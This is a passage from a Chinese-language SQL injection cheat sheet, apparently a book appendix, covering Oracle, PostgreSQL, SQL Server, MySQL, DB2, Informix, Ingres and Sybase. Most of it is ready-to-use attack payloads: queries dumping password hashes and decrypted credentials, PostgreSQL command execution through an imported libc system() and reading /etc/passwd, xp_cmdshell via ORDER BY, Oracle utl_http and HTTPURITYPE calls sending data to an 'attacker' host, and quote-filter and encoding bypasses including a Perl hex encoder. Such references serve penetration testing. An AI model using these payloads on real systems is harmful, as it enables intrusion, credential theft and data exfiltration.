operator">:=</span>UTL_FILE<span class="token punctuation">.</span>fopen<span class="token punctuation">(</span><span class="token string">'EXT'</span><span class="token punctuation">,</span> <span class="token string">'hello.com'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">,</span><span class="token number">32767</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>put_raw<span class="token punctuation">(</span>fi<span class="token punctuation">,</span>bu<span class="token punctuation">,</span><span class="token boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_FILE<span class="token punctuation">.</span>fclose<span class="token punctuation">(</span>fi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>写本地文件：dbms_advisor(Oracle 10g及之后的版本)</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">create</span> <span class="token keyword">directory</span> MYDIR <span class="token keyword">as</span> <span class="token string">'C:\';exec SYS.DBMS_ADVISOR.CREATE_FILE('</span>This <span class="token keyword">is</span> <span class="token keyword">the</span>content<span class="token string">'||chr(13)||'</span>Next line<span class="token string">','</span>MYDIR<span class="token string">','</span>myfile<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>破解数据库口令</li></ul><p>从数据库中提取口令哈希：</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">SELECT</span> <span class="token keyword">name</span><span class="token punctuation">,</span> password <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>user$ <span class="token keyword">where</span> <span class="token keyword">type</span>#<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token keyword">and</span><span class="token keyword">length</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">;</span><span class="token comment">--DES Hashes (7-10g)</span><span class="token keyword">SELECT</span> <span class="token keyword">name</span><span class="token punctuation">,</span> spare4 <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>user$ <span class="token keyword">where</span> <span class="token keyword">type</span>#<span class="token operator">&gt;</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token keyword">length</span><span class="token punctuation">(</span>spare4<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">62</span><span class="token punctuation">;</span> <span class="token comment">--SHA1 Hashes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>提取明文口令：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> view_username<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>view_password<span class="token punctuation">)</span> <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_view_user_credentials<span class="token punctuation">;</span><span class="token keyword">select</span> credential_set_column<span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>credential_value<span class="token punctuation">)</span> <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_credentials2<span class="token punctuation">;</span><span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>aru_username<span class="token punctuation">)</span><span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>aru_password<span class="token punctuation">)</span> <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_aru_credentials<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="PostgreSQL-备忘单"><a href="#PostgreSQL-备忘单" class="headerlink" title="PostgreSQL 备忘单"></a>PostgreSQL 备忘单</h4><p><a href="http://www.postgresql.org/docs/manuals/">www.postgresql.org/docs/manuals/</a></p><ol><li>枚举数据库配置信息和模式</li></ol><p>提取PostgreSQL数据库的配置信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>版本</td><td><code>SELECT version()</code></td></tr><tr><td>当前用户</td><td><code>SELECT getpgusername();  </code><br><code>SELECT user; </code><br> <code>SELECT current user; </code> <br><code>SELECT session user;</code></td></tr><tr><td>列出用户</td><td><code>SELECT usename FROM pg_user</code></td></tr><tr><td>当前用户权限</td><td><code>SELECT  usename, usecreatedb, usesuper, usecatupd FROM pg_user</code></td></tr><tr><td>数据库服务器主机名</td><td><code>SELECT inet_server_addr();</code></td></tr></tbody></table><p>提取PostgreSQL数据库的模式信息</p><table><thead><tr><th>数</th><th>查询</th></tr></thead><tbody><tr><td>当前数据库</td><td><code>SELECT current_database();</code></td></tr><tr><td>列出数据库</td><td><code>SELECT datname FROM pg_database;</code></td></tr><tr><td>列出表</td><td><code>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r' ,'') AND pg_catalog.pg_table_is_visible(c.oid) AND n.nspname NOT IN ('pg_catalog','pg_toast');</code></td></tr><tr><td>列出列</td><td><code>SELECT relname,A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T  WHERE (C.relkind='r') AND (N.nspname ='public') AND  (A.attrelid=C.oid) AND (N.oid=C.relnamespace) AND (A.atttypid=T.oid)  AND(A.attnum&gt;0) AND (NOT A.attisdropped);</code></td></tr></tbody></table><ol start="2"><li>SQL盲注函数：PostgreSQL</li></ol><p>SQL盲注函数</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>字符串长度</td><td><code>LENGTH()</code></td></tr><tr><td>从给定字符串中提取子串</td><td><code>SUBSTRING(string,offset,length)</code></td></tr><tr><td>字符串(‘ABC)不带单引号的表示方式</td><td>`SELECT CHR(65)</td></tr><tr><td>触发时间延迟</td><td><code>SELECT pg_sleep(10); --触发10s的延迟</code></td></tr></tbody></table><ol start="3"><li>攻击数据库服务器：PostgreSQL</li></ol><p>PostgreSQL并未提供执行操作系统命令的内置存储过程，不过可以从外部的.dll或共享对象(shared object)(.so)文件中导入堵如system()这样的函数。借助PostgreSQL并使用COPY语句同样可以读取本地文件。</p><ul><li>执行系统命令</li></ul><p>对于8.2版本之前的PostgreSQL数据库服务器，从标准UNIX libc库导入system函数：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> system<span class="token punctuation">(</span>cstring<span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">int</span> <span class="token keyword">AS</span> <span class="token string">'/lib/libc.so.6'</span><span class="token punctuation">,</span> <span class="token string">'system'</span> <span class="token keyword">LANGUAGE</span> <span class="token string">'C'</span> STRICT<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来可以通过执行下列SQL查询调用system函数：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> system<span class="token punctuation">(</span><span class="token string">'command'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>访问本地文件</li></ul><p>可以使用下列SQL语句并借助超级用户账户来读取本地文件，这些文件是使用操作系统级的PostgreSQL用户账户打开的</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> filedata<span class="token punctuation">(</span>t <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY filedata <span class="token keyword">FROM</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">;</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以使用下列SQL语句来写本地文件，这些文件也是使用操作系统级的PostgreSQL用户账户创建的</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> thefile<span class="token punctuation">(</span>evildata <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> thefile<span class="token punctuation">(</span>evildata<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'some evil data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY thefile <span class="token punctuation">(</span>evildata<span class="token punctuation">)</span> <span class="token keyword">TO</span> <span class="token string">'/tmp/evilscript.sh'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>破解数据库口令</li></ul><p>列出PostgreSQL数据库中的用户名和口令</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> usename<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>passwd <span class="token keyword">from</span> pg_shadow<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="避开输入验证过滤器"><a href="#避开输入验证过滤器" class="headerlink" title="避开输入验证过滤器"></a>避开输入验证过滤器</h3><h4 id="引号过滤器"><a href="#引号过滤器" class="headerlink" title="引号过滤器"></a>引号过滤器</h4><p>不使用引号字符表示字符串</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>平   台</td><td>查  询</td></tr><tr><td>Microsoft SQL Server</td><td><code>SELECT char(0x41) + char(0x42) + char(0x43);</code></td></tr><tr><td>MySQL Server</td><td><code>SELECT char (65,66,67);</code><br><code>  SELECT 0x414243;</code></td></tr><tr><td>Oracle</td><td>`SELECT chr(65)</td></tr><tr><td>PostgreSQL</td><td>`SELECT chr(65)</td></tr></tbody></table><p>Microsoft SQL Server还支持在变量中构造查询，然后调用EXEC来执行它。</p><p>创建了一个名为@q的变量，并借助一个十六进制编码的字符串将SELECT’ABC’查询赋值给该变量：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@q</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token variable">@q</span><span class="token operator">=</span><span class="token number">0x53454c454354202741424327</span><span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token variable">@q</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>采用该技术可以在不向应用程序提交任何引号字符的前提下，执行任意查询。可以使用下列Perl脚本并借助该技术来自动编码SQL语句：</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token comment">#!/usr/bin/perl</span><span class="token keyword">print</span> <span class="token string">"Enter SQL query to encode:"</span><span class="token punctuation">;</span><span class="token variable">$teststr</span><span class="token operator">=</span><span class="token filehandle symbol">&lt;STDIN&gt;</span><span class="token punctuation">;</span>chomp <span class="token variable">$teststr</span><span class="token punctuation">;</span><span class="token variable">$hardcoded_sql</span> <span class="token operator">=</span><span class="token string">'declare @q varchar(8000)'</span><span class="token operator">.</span><span class="token string">'select @q=0x***'</span><span class="token operator">.</span><span class="token string">'exec(@q)'</span><span class="token punctuation">;</span><span class="token variable">$prepared</span> <span class="token operator">=</span> encode_sql<span class="token punctuation">(</span><span class="token variable">$teststr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hardcoded_sql</span> <span class="token operator">=~</span><span class="token regex">s/\*\*\*/$prepared/g</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token string">""</span><span class="token operator">\</span>n<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span><span class="token operator">-</span>Encoded SQL<span class="token punctuation">:</span><span class="token operator">\</span>n<span class="token operator">\</span>n<span class="token string">";print $hardcoded_sql ."</span><span class="token operator">\</span>n<span class="token string">";sub encode_sql{@subvar=@_;my $sqlstr =$subvar[0];@ASCII = unpack("</span>C<span class="token operator">*</span>"<span class="token punctuation">,</span><span class="token variable">$sqlstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token variable">$line</span> <span class="token punctuation">(</span><span class="token variable">@ASCII</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$encoded</span> <span class="token operator">=</span> sprintf<span class="token punctuation">(</span><span class="token string">'%lx'</span><span class="token punctuation">,</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$encoded_command</span> <span class="token operator">.=</span><span class="token variable">$encoded</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token variable">$encoded_command</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="HTTP-编码"><a href="#HTTP-编码" class="headerlink" title="HTTP 编码"></a>HTTP 编码</h4><p>有时可以使用外来编码标准或者借助双重编码来编码输入，以避开那些拒绝已知不良字符 (通常称为黑名单)的输入验证过滤器。</p><p>编码后的SQL元字符</p><table><thead><tr><th>字   符</th><th>编码后的变量</th></tr></thead><tbody><tr><td>‘</td><td>%27<br>%2527<br>%u0027<br>%u02b9<br>%ca%b9</td></tr><tr><td>“</td><td>%22<br>%2522<br>%u0022<br>%uff02<br>%ef%bc%82</td></tr><tr><td>;</td><td>%3b<br>%253b<br>%u0003b<br>%ufflb<br>%ef%bc%9b</td></tr><tr><td>(</td><td>%28<br>%2528<br>%u0028<br>%uff08<br>%ef%bc%88</td></tr><tr><td>)</td><td>%29<br>%2529<br>%u0029<br>%uff09<br>%ef%bc%89</td></tr><tr><td>［空格］</td><td>%20<br>%2520<br>%u0020<br>%ff00<br>%c0%a0</td></tr></tbody></table><h3 id="排查SQL注入攻击"><a href="#排查SQL注入攻击" class="headerlink" title="排查SQL注入攻击"></a>排查<strong>SQL</strong>注入攻击</h3><p>排查SQL注入时的参考资料</p><table><thead><tr><th>解决方案</th><th>错误/挑战</th></tr></thead><tbody><tr><td>挑战<br>执行一次UNION SELECT攻击，其原始查询用于检索image类型的列。<br>错误消息<br> <code>Image is incompatible with int/ The image data type cannot be selected as DISTINCT because it is not compatible.</code></td><td>将<code>UNION SELECT</code>语句修改成读<code>UNION ALL SELECT</code><br>这样能解决当<code>UNION SELECT</code>尝试与image数据类型进行比较操作时出现的相关问题。<br>例如：<code>UNION ALL SELECT null,null,null</code></td></tr><tr><td>挑战<br>注入ORDER BY子句<br>注入的数据位于ORDER BY子句右边。许多常用的技巧（比如UNION SELECT）将不起作用。<br>本例执行下列SQL查询，其中攻击者的数据是注入点：<code>SELECT  FROM products GROUP BY attackers data DESC</code></td><td>Microsoft SQL Server <br>Microsoft SQL Server支持使用分号(;)作为每个新查询的堆叠查询的开始。可以按下列方式来实施多种攻击，比如基于时间延迟的数据检索和扩展存储过程的执行：<br><code>ORDER BY 1；EXEC master..xp_cmdshell'cmd'</code><br>还可以利用Microsoft SQL Server并通过错误消息来返回查询结果数据。注入ORDER BY子句时，可以使用下列语法：<br><code>ORDER BY (1/(@@version)); -- 返回版本号</code><br><code>ORDER BY 1/(SELECT TOP 1 name FROM sysobjects WHERE xtype='U');--从sysobjects返回名称</code><br>MySQL Server<br>可以在ORDER BY子句中使用基于时间延迟的SQL盲注。如果当前用户为root@localhost，那么下面的例子会触发时间延迟：<br><code>ORDER BY(IF((SELECT user()='root@localhost'),sleep(2),1));</code><br>Oracle可以使用utl_http包并通过攻击者选择的任何TCP端口来建立向外的HTTP连接。接下来的ORDER BY子句通过端口1000与主机攻击者建立了一条HTTP连接。<br>该HTTP请求在请求路径中包含了Oracle的版本标志：`ORDER BY utl_http.request(‘<a href="http://attacker:1000/">http://attacker:1000/</a>‘</td></tr><tr><td>挑战<br>因为删除了公共权限，所以ut http无法起作用。<br>错误消息<br><code>ORA-00904 invalid identifier</code></td><td>许多Oracle安全指南建议从utl_http包中删除公共权限。不过，很多人忽视这样一个事实可使用 HTTPURITYPE对象类型实现相同的目的，而且同样能被公共权限访问到。<br>`SELECT HTTPURITYPE(‘<a href="http://attacker:1000/">http://attacker:1000/</a>‘</td></tr><tr><td>挑战<br>utl inaddr不起作用。<br>存在多种原因，比如版本11中的访问控制列表（ACL），权限已经被撤销以及未安装Java等。<br>错误消息<br><code>ORA-00904 invalid identifier ORA-24247 network access denied by access control list ACL）-11g ORA-29540 oracle/plsql/net/InternetAddress</code></td><td>在可以控制错误消息内容的位置使用不同的函数。根据数据库版本及安装组件的不同，下面是候选函数的一个列表：<br><code>ORDER BY ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE rownum=1),null,null) ORDER BY SYS.DBMS_AW_XML.READAWMETADATA((SELECT banner FROM v$version WHERE rownum=1),null) ORDER BY CTXSYS.DRITHSX.SN((SELECT banner FROM v$version WHERE rownum=1),user)ORDER BY CTXSYS.CTX_REPORT.TOKEN_TYPE(user,(SELECT banner FROM v$version WHERE rownum=1))</code></td></tr><tr><td>挑战<br>执行针对MySQL数据库的UNION SELECT攻击时收到<code>illegal mix of collations</code>消息。<br>错误消息<br><code>illegal mix of collations(latinl_swedish_ci,IMPLICIT) and(utf8_general_ci,SYSCONST)for operation 'UNION'</code></td><td>可以使用CAST函数解决该错误。<br>例如：<br><code>UNION SELECT user(),null,null;</code><br>变为：<br><code>UNION SELECT CAST(user() ASchar),null,null;</code></td></tr><tr><td>挑战<br>执行针对Microsoft SQL Server数据库的UNION SELECT攻击时收到<code>collation conflict"</code>消息。<br>错误消息<br><code>Cannot resolve collation conflict for column 2 in SELECT statement</code></td><td>要想解决该错误，一种方法是从数据库读取Collation属性，然后在查询中使用。在下面的例子中，我们执行<code>UNION ALL SELECT</code>查询来检索sysobject表中的name列。<br>步骤1：检索collation的值<br><code>UNION ALL SELECT SERVERPROPERTY（'Collation'），null FROM sysobjects</code><br>本例中，我们将Collation属性设置为<code>SQL_Latinl_General_CPl_CI_AS</code><br>步骤2：在<code>UNION SELECT</code>中实现collation的值<code>UNION ALL SELECT 1,Name collate SQL Latinl General CPl_CI_AS,null FROM sysobjects</code></td></tr></tbody></table><h3 id="其他平台上的SQL注入"><a href="#其他平台上的SQL注入" class="headerlink" title="其他平台上的SQL注入"></a>其他平台上的<strong>SQL</strong>注入</h3><h4 id="DB2备忘单"><a href="#DB2备忘单" class="headerlink" title="DB2备忘单"></a>DB2备忘单</h4><p>在与Web应用集成的众多数据库中，IBM的DB2数据库服务器可能是其中最不流行的一种数据库平台。不过，Linux、UNIX和Windows版本(DB2 LUW)正日渐流行。</p><ol><li>枚举数据库配置信息和模式</li></ol><p>提取DB2数据库的配置信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>版本</td><td><code>SELECT versionnumber, version_timestamp  FROM sysibm.sysversions;</code></td></tr><tr><td>当前用户</td><td><code>SELECT user FROM sysibm.sysdummy1;</code><br><code>SELECT session_user FROM sysibm.sysdummyl;</code><br><code> SELECT system_user FROM sysibm.sysdummyl;</code></td></tr><tr><td>列出用户</td><td><code>SELECT grantee FROM syscat.dbauth;</code></td></tr><tr><td>当前用户权限</td><td><code>SELECT * FROM syscat.dbauth WHERE  grantee =user;</code><br><code> SELECT * FROM syscat.tabauth WHERE grantee =user;</code><br><code> SELECT *  FROM syscat.tabauth;</code></td></tr></tbody></table><p>提取DB2数据库的模式信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>当前数据库</td><td><code>SELECT current_server FROM sysibm.sysdummyl;</code></td></tr><tr><td>列出数据库</td><td><code>SELECT schemaname FROM syscat.schemata;</code></td></tr><tr><td>列出表</td><td><code>SELECT name FROM sysibm.systables;</code></td></tr><tr><td>列出列</td><td><code>SELECT name, tbname, coltype FROM sysbibm.syscolumns;</code></td></tr></tbody></table><ol start="2"><li>SQL盲注函数：DB2</li></ol><p>SQL盲注函数</p><table><thead><tr><th>数   据</th><th>查  询</th></tr></thead><tbody><tr><td>字符串长度</td><td><code>LENGTH()</code></td></tr><tr><td>从给定字符串中提取子串</td><td><code>SUBSTRING(string,offset,length) FROM  sysibm.sysdummyl;</code></td></tr><tr><td>字符串(‘ABC’)不带单引号的表示方式</td><td>`SELECT CHR(65)</td></tr></tbody></table><h4 id="Informix-备忘单"><a href="#Informix-备忘单" class="headerlink" title="Informix 备忘单"></a>Informix 备忘单</h4><p>Informix数据库服务器也是由IBM负责经销的，相比其他数据库平台，它不是很常见。</p><ol><li>枚举数据库配置信息和模式</li></ol><p>提取Informix数据库的配置信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>版本</td><td><code>SELECT DBINFO('version','full') FROM systables WHERE tabid = 1;</code></td></tr><tr><td>当前用户</td><td><code>SELECT USER FROM systables WHERE tabid = 1;</code></td></tr><tr><td>列出用户</td><td><code>select usertype,username,password from sysusers;</code></td></tr><tr><td>当前用户权限</td><td><code>select tabname, tabauth, grantor, grantee FROM systabauth join systables on systables.tabid = systabauth.tabid</code></td></tr><tr><td>数据库服务器主机名</td><td><code>SELECT DBINFO('dbhostname') FROM systables WHERE tabid=1;</code></td></tr></tbody></table><p> 提取Informix数据库的模式信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>当前数据库</td><td><code>SELECT DBSERVERNAME FROM systables WHERE tabid = 1;</code></td></tr><tr><td>列出数据库</td><td><code>SELECT name, owner FROM sysdatabases;</code></td></tr><tr><td>列出表</td><td><code>SELECT tabname FROM systables; </code><br><code> SELECT tabname, viewtext FROM sysviews join systables on systables.tabid = sysviews.tabid;</code></td></tr><tr><td>列出列</td><td><code>SELECT tabname, colname, coltype FROM  syscolumns join systables on  syscolumns.tabid = systables.tabid;</code></td></tr></tbody></table><ol start="2"><li>SQL 盲注函数：Informix</li></ol><p>SQL盲注函数</p><table><thead><tr><th>数   据</th><th>查  询</th></tr></thead><tbody><tr><td>字符串长度</td><td><code>LENGTH()</code></td></tr><tr><td>从给定字符串中提取子串</td><td><code>SELECT SUBSTRING('ABCD' FROM 4 FOR 1) FROM  systables where tabid = 1;  --返回'D';</code></td></tr><tr><td>字符串(‘ABC’)不带单引号的表示方式</td><td>`SELECT CHR(65)</td></tr></tbody></table><h4 id="Ingres-备忘单"><a href="#Ingres-备忘单" class="headerlink" title="Ingres 备忘单"></a>Ingres 备忘单</h4><p>Ingres是一种可以在所有主流操作系统上使用的开源数据库。</p><ol><li>枚举数据库配置信息和模式</li></ol><p>提取Ingres数据库的配置信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>版本</td><td><code>SELECT dbsminfo('version');</code></td></tr><tr><td>当前用户</td><td><code>SELECT dbsminfo('system user');</code><br><code> SELECT dbsminfo('session user');</code></td></tr><tr><td>列出用户</td><td><code>SELECT name, password FROM iiuser;</code></td></tr><tr><td>当前用户权限</td><td><code>SELECT dbsminfo('select_syscat');</code><br><code>SELECT dbsminfo('db_privileges');</code><br><code>SELECT  dbsminfo('current_priv_mask'); </code><br><code>SELECT dbsminfo('db_admin');</code><br><code>SELECT dbsminfo('security_priv');</code><br><code>SELECT dbsminfo('create_table'); </code><br><code>SELECT dbsminfo('create procedure');</code></td></tr></tbody></table><p> 提取Ingres数据库的模式信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>当前数据库</td><td><code>SELECT dbmsinfo(database');</code></td></tr><tr><td>列出表</td><td><code>SELECT relid, relowner, relloc FROM iirelation WHERE relowner != '$ingres';</code></td></tr><tr><td>列出列</td><td><code>SELECT column_name, column_datatype,  table_name, table_owner FROM iicolumns;</code></td></tr></tbody></table><ol start="2"><li>SQL盲注函数：Ingres</li></ol><p>SQL盲注函数</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>字符串长度</td><td><code>LENGTH()</code></td></tr><tr><td>从给定字符串中提取子串</td><td><code>SELECT substr(string, offset, length); -- </code></td></tr><tr><td>字符串(‘ABC’)不带单引号的表示方式</td><td>`SELECT chr(65)</td></tr></tbody></table><h4 id="Sybase-备忘单"><a href="#Sybase-备忘单" class="headerlink" title="Sybase 备忘单"></a>Sybase 备忘单</h4><p>Sybase与Microsoft SQL Server共享了共同的遗产，在Microsoft SQL Server中使用的很多 方法对于Sybase同样有效，往往只须在所用命令的语法上稍加修改即可。</p><ol><li>枚举数据库配置信息和模式</li></ol><p>提取Sybase数据库的配置信息</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>数   据</td><td>查   询</td></tr><tr><td>版本</td><td><code>SELECT @@version;</code></td></tr><tr><td>当前用户</td><td><code>SELECT username();</code><br><code> SELECT suser_name();</code><br><code> SELECT user;</code></td></tr><tr><td>列出用户</td><td><code>SELECT name FROM master..syslogins;</code></td></tr><tr><td>当前用户权限</td><td><code>SELECT show role(); </code><br><code> EXEC sp_helprotect &lt;user&gt;;</code></td></tr></tbody></table><p>提取Sybase数据库的模式信息</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>当前数据库</td><td><code>SELECT db_name();</code></td></tr><tr><td>列出数据库</td><td><code>SELECT name FROM master..sysdatabases;</code></td></tr><tr><td>列出表</td><td>列出当前数据库中的表： <br><code>SELECT name FROM sysobjects WHERE type='U'; </code><br><code>SELECT name FROM sysobjects WHERE type='V'-- 视图 </code><br>列出master数据库中的表： <br><code>SELECT name FROM master..sysobjects WHERE type= 'U';</code><br><code>SELECT name FROM  master..sysobjects WHERE type='V';</code></td></tr><tr><td>列出列</td><td>列出当前数据库中tblUsers表的各个列的名称：<br><code>SELECT name FROM syscolumns WHERE  id=object_ id('tblUsers');</code><br>  列出admin数据库中tblUsers表的各个列的名称：<br><code>  SELECT  name FROM admin..syscolumns WHERE id=object_id('admin..tblUsers');</code></td></tr></tbody></table><ol start="2"><li>SQL盲注函数：Sybase</li></ol><p>SQL盲注函数</p><table><thead><tr><th>数   据</th><th>查   询</th></tr></thead><tbody><tr><td>字符串长度</td><td><code>LEN();</code></td></tr><tr><td>从给定字符串中提取子串</td><td><code>SUBSTRING(string,offset,length);</code></td></tr><tr><td>字符串(‘ABC’)不带单引号的表示方式</td><td><code>SELECT char(65)+char(66)+char(67);</code></td></tr></tbody></table><h4 id="Microsoft-Access"><a href="#Microsoft-Access" class="headerlink" title="Microsoft Access"></a>Microsoft Access</h4><p>Microsoft Access数据库无法很好地适应企业级应用，所以通常只在具有极小数据库需求 的应用中才会遇到。</p><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><h4 id="SQL注入白皮书"><a href="#SQL注入白皮书" class="headerlink" title="SQL注入白皮书"></a>SQL注入白皮书</h4><ul><li>Victor Chapela 撰写的 “Advanced SQL Injection” : <a href="www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt">www.owasp.org/index.php/Image:Advanced_SQL_Injection.ppt</a></li><li>Chris Anley撰写的”Advanced SQL Injection in SQL Server Applications”：<a href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">www.ngssoftware.com/papers/advanced_sql_injection.pdf</a></li><li>Gary O’Leary-Steele撰写的”Buffer Truncation Abuse in.NET and Microsoft SQL<br>Server”：<a href="http://scanner.sec-1.com/resources/bta.pdf">http://scanner.sec-1.com/resources/bta.pdf</a></li><li>Brett Moore撰写的”Access through Access”：<a href="http://www.insomniasec.com/publications/Access-Through-Access.pdf">www.insomniasec.com/publications/Access-Through-Access.pdf</a></li><li>Chema Alonso撰写的”Time-Based Blind SQL Injection with Heavy Queries”：<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">http://technet.microsoft.com/en-us/library/cc512676.aspx</a></li></ul><h4 id="SQL注入备忘单"><a href="#SQL注入备忘单" class="headerlink" title="SQL注入备忘单"></a>SQL注入备忘单</h4><ul><li><p>PentestMonkey.com 针对 Oracle、Microsoft SQL Server、MySQL、PostgreSQL、Ingres、DB2 和 Informix 的 SQL 注入备忘单：<a href="http://pentestmonkey.net/cheat-sheets/">http://pentestmonkey.net/cheat-sheets/</a> </p></li><li><p>Michaeldaw.org 针对 Sybase、MySQL、OraclePostgreSQL、DB2 和 Ingres 的 SQL 注 入备忘单：<a href="http://michaeldaw.org/sql-injection-cheat-sheet/">http://michaeldaw.org/sql-injection-cheat-sheet/</a></p></li><li><p>Ferruh Mavituna 针对 MySQL、SQL Server、PostgreSQL 和 Oracle 的 SQL 注入备忘单： <a href="http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/">http://ferruh.mavituna.com/sql-injection-cheatssheet-oku/</a></p></li><li><p>Ferruh Mavituna 针对 Oracle 的 SQL 注入备忘单：<a href="http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/">http://ferruh.mavituna.com/oracle-injection-cheat-sheet-oku/</a></p></li></ul><h4 id="SQL注入利用工具"><a href="#SQL注入利用工具" class="headerlink" title="SQL注入利用工具"></a>SQL注入利用工具</h4><ul><li><p>Absinthe 是一款基于 Windows GUI 的利用工具，支持 Microsoft SQL Server、Oracle、PostgreSQL 和 Sybase，并使用 SQL 盲注和基于错误的 SQL 注入：<a href="http://www.0x90.org/releases/absinthe/">www.0x90.org/releases/absinthe/</a></p></li><li><p>SQLBrute是一款基于时间和错误的SQL盲注工具，支持Microsoft SQL Server和Oracle： <a 